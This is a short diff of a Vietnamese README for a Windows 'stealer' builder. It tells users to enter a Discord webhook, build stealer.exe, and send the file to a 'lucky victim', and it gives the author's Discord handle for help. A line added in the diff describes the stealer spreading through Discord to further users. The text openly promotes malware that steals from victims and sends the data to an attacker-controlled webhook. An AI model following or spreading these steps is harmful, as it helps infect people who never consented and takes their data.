@@ -12,9 +12,11 @@ chỉ hack cho máy tính (windows 7 - 10)
 2. nhập webhook discord  
 3. nhấn build vào gửi cho nạn nhân may mắn hoặc nhờ tôi nhé (discord:skid02233) !
 
-stealer.exe là file hack
+stealer.exe là file hack khi nhấn build
 
 nó có thể hack cực kỳ xịn
+
+nhưng vì nó free nên khi người dùng nhiễm stealer gửi qua discord người dùng đó nhiễm stealer này 
 
 
 <details>
